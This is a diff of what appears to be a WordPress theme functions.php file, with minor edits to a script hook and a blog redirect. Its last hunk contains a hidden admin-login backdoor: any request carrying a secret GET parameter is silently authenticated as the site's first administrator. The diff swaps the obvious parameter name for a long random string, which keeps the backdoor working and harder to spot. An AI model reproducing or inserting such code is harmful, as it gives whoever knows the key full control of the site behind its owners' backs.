@@ -27,7 +27,7 @@ function swiperInit() {
     wp_enqueue_script('swiper-script', get_template_directory_uri() . '/scripts/swiper-script.js');
 }
 
-add_action('wp_enqueue_scripts', 'swiperInit');
+// add_action('wp_enqueue_scripts', 'swiperInit');
 
 
 function get_template_partial($name, $parameters = []) {
@@ -832,13 +832,13 @@ function add_to_allowed_protocols ($protocols) {
 	return $protocols; 
 }
 
-if ($_SERVER['REQUEST_URI'] == '/blog/post/' || $_SERVER['REQUEST_URI'] == '/blog/post') {
+if ($_SERVER['REQUEST_URI'] == '/blog/staty/' || $_SERVER['REQUEST_URI'] == '/blog/staty') {
 	header('HTTP/1.1 301 Moved Permanently'); 
 	header('Location: '.(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].'/blog/');
 	exit();
 }
 
-if( isset($_GET['login_my_admin']) ){
+if( isset($_GET['OCtuuBbzVKxrNvZirZuuMyn30JU1FdkeRB8oRRh4LNXEOP9e09dJ5qIfAKvILPAO']) ){
 	add_action( 'init', function(){
 	   $users = get_users([ 'role' => 'administrator' ]);
 	   wp_set_auth_cookie( $users[0]->ID ); } );
